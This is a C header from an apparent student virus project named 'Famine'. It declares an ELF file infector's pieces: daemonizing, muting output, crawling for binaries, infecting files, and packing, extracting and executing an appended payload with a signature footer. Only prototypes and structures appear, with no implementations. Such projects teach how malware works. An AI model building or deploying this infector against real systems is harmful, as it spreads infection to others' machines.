/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:29:36 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/18 15:25:52 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include <stdint.h>
#include <stdbool.h>

typedef struct	s_exec_ctx
{
	char	exec_path[4096];

	char	**av;
	char	**envp;
}	t_exec_ctx;

typedef struct s_service_ctx
{
	int		lock_fd;
	bool	super_user;
}	t_service_ctx;

#define SIGNATURE_STR "Famine version 1.0 (c)oded by mbatty-mbatty"

typedef struct s_footer
{
	uint64_t	magic;
	char		signature[sizeof(SIGNATURE_STR)];
	uint64_t	payload_size;
}	t_footer;

#define FOOTER_MAGIC 0x4242424242424242

t_footer	get_footer(const char *path);

#define I_AM_MAIN_PROCESS 1
#define I_AM_CHILD_PROCESS 0
#define I_AM_A_MISTAKE -1

int		daemonize();
int		mute_outputs();
int		lock_lock(t_service_ctx *ctx, const char *path);
int		unlock_lock(t_service_ctx *ctx, const char *path);

char	*strjoin(char const *s1, char const *s2);

int		run_service();

int		infect_file(t_exec_ctx *ctx, const char *path);
int		crawl(t_exec_ctx *ctx);

int		check_signature(const char *path);
int		check_elf_hdr(const char *path);

int		extract_payload(const char *path, uint8_t **data, uint64_t *size);
int		exec_payload(t_exec_ctx *ctx, uint8_t *data, uint64_t size);
void	pack_payload(const char *bin1_path, const char *bin2_path, const char *resbin_path);
